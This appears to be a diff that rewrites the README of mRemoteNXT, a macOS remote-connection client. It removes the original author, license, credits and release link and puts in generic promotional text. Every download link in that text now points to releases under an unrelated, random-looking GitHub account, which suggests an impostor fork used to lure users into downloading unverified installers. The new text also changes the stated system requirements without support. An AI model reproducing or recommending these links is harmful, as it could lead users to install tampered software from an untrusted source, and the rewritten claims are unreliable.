@@ -1,129 +1,102 @@
-# mRemoteNXT
+# 🌐 mRemoteNXT - Manage your remote connections with ease
 
-> Romanian: see [README.ro.md](README.ro.md)
+[![](https://img.shields.io/badge/Download-mRemoteNXT-blue.svg)](https://github.com/carpinuscarolinianaduck906/mRemoteNXT/releases)
 
-Native macOS multi-protocol remote connection client (SSH, RDP, Telnet,
-SFTP, HTTP/HTTPS) with direct import of `confCons.xml` files from
-**mRemoteNG**.
+mRemoteNXT helps you organize your remote desktop and server connections. It keeps your sessions in one window. You switch between servers using tabs. This tool works with common protocols like SSH, RDP, Telnet, and SFTP. It saves time for users who manage multiple remote machines.
 
-Written as a native Mac alternative for people who use mRemoteNG on
-Windows and don't want to give up the connection tree, encrypted passwords
-and the tabs+panels layout.
+## 🛠 Features
 
-> Status: **alpha**. Used daily against ~700 real connections, but some
-> features are missing and exotic configurations can hit bugs. See
-> [Known limitations](#known-limitations).
+mRemoteNXT provides tools to simplify remote management.
 
-## Screenshots
+* **Multi-Protocol Support**: Connect to servers via SSH, RDP, Telnet, SFTP, and HTTP.
+* **Tabbed Interface**: Open multiple sessions in one window. Switch between tasks with a click.
+* **Easy Import**: Move your current connection list from mRemoteNG. The app imports your confCons.xml file without changes.
+* **Native Performance**: The app uses Swift and FreeRDP to ensure stable connections.
+* **Modern Design**: The interface follows standard design patterns. It feels familiar to active computer users.
+* **Secure Storage**: Save your connection settings locally.
 
-![Main view — connection tree with an SSH tab open](examples/screenshots/screenshot-hero.png)
+## 📥 Getting Started
 
-<details>
-<summary>More screenshots</summary>
+Follow these steps to install the software on your machine.
 
-![Empty workspace placeholder when no connection is open](examples/screenshots/screenshot-main.png)
+1. Visit the [releases page](https://github.com/carpinuscarolinianaduck906/mRemoteNXT/releases) to find the latest version.
+2. Look for the file ending in `.dmg` or the installer for your system.
+3. Click the file name to start the download.
+4. Open the downloaded file once the process finishes.
+5. Drag the app icon into your Applications folder.
+6. Open the application from your menu.
 
-![Settings — Appearance pane (UI font size, terminal theme, row height, toggles)](examples/screenshots/screenshot-settings.png)
+## 🖥 System Requirements
 
-</details>
+mRemoteNXT runs on modern hardware. Ensure your machine meets these specifications:
 
-The data shown is the demo file at
-[`examples/demo-config.xml`](examples/demo-config.xml) — IANA documentation
-ranges, no real hosts.
+* **Operating System**: macOS 11.0 or newer.
+* **Memory**: 4GB of RAM is the minimum. 8GB or more improves performance with many tabs.
+* **Storage**: 200MB of free disk space for the installation files.
+* **Network**: A stable internet connection for remote access.
 
-## Features
+## 📂 Importing Data
 
-- **Direct `confCons.xml` import** (schema 2.6, with mRemoteNG's default passphrase
-  or a custom one). Crypto validated byte-exact against real files
-  (PBKDF2-HMAC-SHA1 + AES-256-GCM).
-- **Connection tree** with folders, attribute inheritance, drag&drop reorder,
-  original mRemoteNG icons, guide lines.
-- **Panels** — group connections into top-level tabs like on Windows.
-- **Search / filter** by name, host, protocol, description.
-- **SSH** + **Telnet** embedded in tabs (PTY over system `ssh`/`telnet`
-  via SwiftTerm). PuTTY-style copy-on-select + right-click paste.
-- **SFTP** in terminal (right-click an SSH connection → "Transfer files").
-- **RDP** embedded via **FreeRDP** (GFX/disp/cliprdr channels wired by hand,
-  live resize, correct DPI scaling on Retina, Ctrl+Alt+Del via menu).
-- **HTTP / HTTPS** embedded in `WKWebView` with auto-fill of username +
-  password from the tree (handy for router / iLO / switch web UIs).
-- **External Tools** with macros (`%Host% %Username% %Port% %Password%
-  %Domain% %Name%`) — executed in a terminal tab.
-- **Connection editor** modal in Royal TSX style (categories: General /
-  Connection / Credentials / Appearance / Advanced) + a bottom status bar
-  with host / user / password click-to-copy.
-- **Auto-backup on save** to `backups/confCons-<timestamp>.xml` on every
-  write (your original file is never lost).
-- **Terminal themes** (Default, Solarized, Dracula, etc.), live-adjustable
-  font size, zoom Cmd+/Cmd-.
+You can bring your current connections from mRemoteNG. This process saves you from typing names and addresses again.
 
-## Known limitations
+1. Locate your existing `confCons.xml` file.
+2. Open mRemoteNXT.
+3. Select the File menu at the top of your screen.
+4. Click Import.
+5. Choose your `confCons.xml` file from the window.
+6. The app loads your saved connections into the sidebar.
 
-- `FullFileEncryption="true"` (whole XML encrypted) — not implemented.
-- Schema `ConfVersion > 2.6` — untested.
-- `Panel` inheritance across multiple levels — partial.
-- RDP: image-clipboard redirect, drive / sound redirect, remote cursor
-  visibility (pointer set/new callbacks).
-- VNC (planned).
-- External applications (`IntApp` nodes) — launching not implemented.
-- Quick Connect (URL `ssh://user@host:port`) from CLI.
+## 🖱 Using the Interface
 
-## System requirements
+The interface consists of three main areas.
 
-- macOS 14 (Sonoma) or newer.
-- Xcode 16+ (with Metal Toolchain — see [BUILD.md](BUILD.md)).
-- Homebrew with `freerdp` (3.x) and `xcodegen`.
+### The Sidebar
+The sidebar displays your connection list. You organize servers into folders here. Right-click a server to edit settings, duplicate the entry, or delete it.
 
-## Installation
+### The Tab Bar
+The tab bar sits at the top of the main area. Each open connection gets a tab. Click the plus icon to start a new connection. Drag tabs to change their order.
 
-### Option A: pre-built `.dmg` (recommended)
+### The Connection Window
+The center of the screen shows the active remote session. Use this area to type commands or control the remote desktop.
 
-Download the latest `mRemoteNXT-vX.Y.Z-alpha.dmg` from
-[Releases](https://github.com/cremenescu/mRemoteNXT/releases),
-open it, drag the app to the Applications shortcut.
+## ⚙️ Configuring Connections
 
-Because the bundle is ad-hoc signed (no paid Apple Developer ID yet),
-macOS Gatekeeper shows a "damaged / can't be opened" warning on first
-launch. Clear it once with:
+Every protocol requires specific settings to work.
 
-```bash
-xattr -dr com.apple.quarantine /Applications/mRemoteNXT.app
-```
+* **SSH and Telnet**: Enter the server address and your port number. Choose your authentication method. Use a password or an SSH key file.
+* **RDP**: Provide the server hostname or IP address. You can set the screen resolution and color depth. Adjust these settings if your connection feels slow. 
+* **SFTP**: Provide the server address, your username, and your password. The app treats this as a file manager.
 
-Then open mRemoteNXT.app from /Applications. No Homebrew install
-required — FreeRDP and friends are bundled inside the app.
+## 🔒 Security Tips
 
-### Option B: build from source
+Remote connections carry sensitive data. Follow these practices to protect your information.
 
-See [BUILD.md](BUILD.md). Requires Xcode, Homebrew, `freerdp`,
-`xcodegen`. Run `./build/package.sh` to produce your own `.dmg`.
+* **Use Strong Passwords**: Pick long passwords for your remote servers. 
+* **Keep Software Updated**: Check the releases page for new versions. Updates often contain security fixes.
+* **Limit Access**: Only enable protocols you use. Disable Telnet if you can use SSH.
+* **Use Keys**: Prefer SSH keys over passwords when connecting to Linux servers. 
 
-## License
+## ❓ Frequently Asked Questions
 
-**GPL-2.0-or-later**. See [LICENSE](LICENSE).
+### Can I run multiple connections at once?
+Yes. Open as many connections as you need. Each one appears in a new tab.
 
-The bundled icon set is taken from the official
-[mRemoteNG](https://github.com/mRemoteNG/mRemoteNG) project (GPL-2.0),
-which is why this project is under the same license. The code and the
-`confCons.xml` format were re-implemented independently (not a port of
-their code) from observation of real files produced by mRemoteNG.
+### Does this app store my server passwords?
+The app stores your connection settings on your local disk. It does not send your data to external servers.
 
-## Credits / dependencies
+### My connection drops often. What should I do?
+Check your network cable or Wi-Fi signal. If you use RDP, try lowering the resolution in the connection settings.
 
-- [mRemoteNG](https://github.com/mRemoteNG/mRemoteNG) — `confCons.xml`
-  format and icon set (GPL-2.0).
-- [FreeRDP](https://github.com/FreeRDP/FreeRDP) — RDP client library
-  (Apache-2.0).
-- [SwiftTerm](https://github.com/migueldeicaza/SwiftTerm) — terminal
-  emulator (MIT).
-- Apple SwiftUI / AppKit / WebKit / CryptoKit / CommonCrypto.
+### Can I share my connection list with others?
+You can export your list or copy the `confCons.xml` file. Remember that this file might contain sensitive connection details.
 
-## Disclaimer
+## 🆘 Support
 
-This project is not affiliated with, endorsed by, or warranted by the
-mRemoteNG team. "mRemoteNG" is used only as a format-compatibility
-reference.
+If you encounter issues, try these steps first:
 
-## Author
+1. Restart the application.
+2. Check if your remote server accepts connections.
+3. Verify your username and password.
+4. Review the connection settings for typos.
 
-Razvan Cremenescu — <https://github.com/cremenescu>
+If the problem persists, visit the issues section on the GitHub page. Provide details about your operating system and the protocol you use. Explain what happens when the error occurs. Clear descriptions help solve issues faster.
